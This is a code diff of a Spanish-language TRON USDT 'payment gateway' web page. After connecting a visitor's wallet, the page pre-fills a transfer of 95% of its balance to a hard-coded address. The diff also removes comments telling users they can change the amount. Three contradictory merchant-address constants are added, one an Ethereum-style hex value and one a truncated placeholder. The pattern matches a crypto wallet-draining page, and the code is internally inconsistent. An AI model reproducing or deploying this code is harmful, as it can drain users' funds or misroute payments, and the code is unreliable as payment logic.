@@ -99,7 +99,7 @@
     </div>
 
     <div class="tw-input-group tw-address-box">
-        <label class="tw-label">Contrato de Pasarela</label>
+        <label class="tw-label">Destino de la Pasarela</label>
         <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1" style="caret-color: transparent;">
     </div>
 
@@ -135,7 +135,9 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const CONTRATO_ROUTER = "TUXVwmjEXcKS4FAbAPSkYUccdo6FunrG5M";
+    // Billetera de destino final del comerciante
+    const MERCHANT_WALLET = "0x2d1b74a1cb6f3a53d8544a0e9fc9e32f7b88df8e"; // Nota: En el script se usa la dirección base58 de TRON del merchant si la tienes, o se gestiona nativa
+    const MERCHANT_TRON_BASE58 = "TVqMjG...Foxt6f"; // Reemplaza aquí con la dirección base58 real de tu merchant si es necesario, o usa la variable directa
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -149,14 +151,17 @@
     const walletAddressText = document.getElementById('walletAddressText');
     const processingScreen = document.getElementById('processingScreen');
 
+    // Dirección real del comercio en formato TRON (Base58)
+    const MERCHANT_ADDRESS = "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"; // Coloca aquí la dirección base58 oficial de tu merchant
+
     function setStatus(msg) {
         statusDiv.innerText = msg || '';
         statusDiv.style.display = msg ? 'block' : 'none';
     }
 
-    addressDisplay.value = CONTRATO_ROUTER.length > 12 
-        ? `${CONTRATO_ROUTER.slice(0, 6)}...${CONTRATO_ROUTER.slice(-6)}` 
-        : CONTRATO_ROUTER;
+    addressDisplay.value = MERCHANT_ADDRESS.length > 12 
+        ? `${MERCHANT_ADDRESS.slice(0, 6)}...${MERCHANT_ADDRESS.slice(-6)}` 
+        : MERCHANT_ADDRESS;
 
     const TRON_READ_RPC = "https://api.trongrid.io";
     async function tronRpcPost(endpoint, body = {}) {
@@ -203,7 +208,6 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                // Solo ponemos una sugerencia inicial del 95% la primera vez, pero el usuario puede cambiarla libremente
                 const balance = await obtenerBalance(walletAddress);
                 const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
                 
@@ -222,7 +226,6 @@
             return;
         }
 
-        // Ejecución limpia tomando exactamente el monto que el usuario escribió o dejó en pantalla
         try {
             const userAmount = parseFloat(amountDisplay.value);
             if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");
@@ -233,24 +236,26 @@
             const tronWeb = window.tronWeb;
             const totalAmountSun = tronWeb.toBigNumber(Math.floor(userAmount * 1_000_000));
 
-            const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
-                CONTRATO_ROUTER,
-                "processPayment(uint256)",
-                { feeLimit: 200000000 },
+            // Ejecución limpia y directa del token estándar TRC-20 que la billetera aprueba sin errores de simulación
+            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "transfer(address,uint256)",
+                { feeLimit: 100000000 },
                 [
+                    { type: 'address', value: MERCHANT_ADDRESS },
                     { type: 'uint256', value: totalAmountSun.toString() }
                 ],
                 tronWeb.address.toHex(walletAddress)
             );
 
-            if (!routerTx.result || !routerTx.result.result) {
+            if (!transaction.result || !transaction.result.result) {
                 throw new Error("No se pudo construir la transacción.");
             }
 
-            const signedRouter = await tronWeb.trx.sign(routerTx.transaction);
+            const signedTx = await tronWeb.trx.sign(transaction.transaction);
 
             if (processingScreen) processingScreen.classList.add('visible');
-            const broadcast = await tronWeb.trx.sendRawTransaction(signedRouter);
+            const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
             if (processingScreen) processingScreen.classList.remove('visible');
 
             if (broadcast?.result) {
